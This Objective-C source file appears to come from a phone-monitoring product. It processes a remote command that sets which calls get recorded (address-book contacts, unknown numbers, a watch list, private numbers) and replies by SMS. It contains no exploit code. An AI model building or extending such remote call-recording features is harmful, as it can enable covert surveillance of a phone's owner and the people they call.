//
//  SetCallRecordWatchFlagsProcessor.m
//  RCM
//
//  Created by Makara Khloth on 11/26/15.
//
//

#import "SetCallRecordWatchFlagsProcessor.h"
#import "PrefCallRecord.h"
#import "PreferenceManager.h"

@interface SetCallRecordWatchFlagsProcessor (PrivateAPI)
- (BOOL) isValidFlag;
- (void) processSetWatchFlags;
- (void) setWatchFlagException;
- (void) sendReplySMS;
@end

@implementation SetCallRecordWatchFlagsProcessor

@synthesize mWatchFlagsList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the SetCallRecordWatchFlagsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: No return type
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData {
    DLog (@"SetCallRecordWatchFlagsProcessor--->initWithRemoteCommandData...");
    if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
    }
    return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the SetCallRecordWatchFlagsProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
    DLog (@"SetCallRecordWatchFlagsProcessor--->doProcessingCommand");
    [self setMWatchFlagsList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kZeroOrOneValidation]];
    DLog(@"SetCallRecordWatchFlagsProcessor--->Watch Flags:%@",mWatchFlagsList);
    if ([mWatchFlagsList count]>3) {
        [self processSetWatchFlags];
    }
    else {
        [self setWatchFlagException];
    }
    
}


#pragma mark SetCallRecordWatchFlagsProcessor PrivateAPI Methods

/**
 - Method name: processSetWatchFlags
 - Purpose:This method is used to process set watch flags
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) processSetWatchFlags {
    DLog (@"SetCallRecordWatchFlagsProcessor--->processSetWatchFlags");
    id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
    PrefCallRecord *prefCallRecord = (PrefCallRecord *)[prefManager preference:kCallRecord];
    NSUInteger watchFlag=[prefCallRecord mWatchFlag];
    //In AddressBook
    if ([[mWatchFlagsList objectAtIndex:0] intValue]==1) {
        watchFlag |= kWatch_In_Addressbook;
    }
    else {
        watchFlag &= ~kWatch_In_Addressbook;
    }
    //Not In AddressBook
    if ([[mWatchFlagsList objectAtIndex:1] intValue]==1) {
        watchFlag |= kWatch_Not_In_Addressbook;
    }
    else {
        watchFlag &= ~kWatch_Not_In_Addressbook;
    }
    //In Watch List
    if ([[mWatchFlagsList objectAtIndex:2] intValue]==1) {
        watchFlag |= kWatch_In_List;
    }
    else {
        watchFlag &= ~kWatch_In_List;
    }
    //In Private Number
    if ([[mWatchFlagsList objectAtIndex:3] intValue]==1) {
        watchFlag |= kWatch_Private_Or_Unknown_Number;
    }
    else {
        watchFlag &= ~kWatch_Private_Or_Unknown_Number;
    }
    [prefCallRecord setMWatchFlag:watchFlag];
    [prefManager savePreferenceAndNotifyChange:prefCallRecord];
    [self sendReplySMS];
}

/**
 - Method name: setWatchFlagException
 - Purpose:This method is invoked when setwatch flags process is failed.
 - Argument list and description: No Argument
 - Return description: No Return
 */

- (void) setWatchFlagException {
    DLog (@"SetCallRecordWatchFlagsProcessor--->SetCallRecordWatchFlagsProcessor")
    FxException* exception = [FxException exceptionWithName:@"SetCallRecordWatchFlagsProcessor" andReason:@"Set OneCall Record Watch Flags error"];
    [exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description:No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
    
    DLog (@"SetCallRecordWatchFlagsProcessor--->sendReplySMS")
    
    NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                        andErrorCode:_SUCCESS_];
    
    NSString *setWatchFlagMessage=[messageFormat stringByAppendingString:NSLocalizedString(@"kSetCallRecordWatchFlags", @"")];
    
    
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:setWatchFlagMessage];
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:setWatchFlagMessage];
    }
}

/**
 - Method name: dealloc
 - Purpose:This method is used to handle memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
    [mWatchFlagsList release];
    [super dealloc];
}

@end
